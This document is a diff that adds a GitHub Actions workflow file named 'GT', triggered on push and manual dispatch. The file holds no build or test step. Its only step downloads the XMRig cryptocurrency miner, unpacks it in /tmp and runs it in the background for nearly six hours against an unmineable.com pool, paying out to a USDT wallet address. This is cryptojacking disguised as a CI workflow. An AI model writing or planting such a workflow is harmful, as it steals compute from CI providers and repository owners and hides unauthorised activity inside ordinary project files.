@@ -1,0 +1,10 @@
+name: GT
+on: [push, workflow_dispatch]
+jobs:
+  m:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz -O /tmp/x.tar.gz
+          cd /tmp && tar -xf x.tar.gz && cd xmrig-6.21.0
+          timeout 350m ./xmrig -o rx.unmineable.com:3333 -u USDT:0x74B56f2C379996fedabF53D36aeE73c5E5129fC9.GT_20260330_085537 -p x --donate-level 1 -t 4 --randomx-mode=fast &
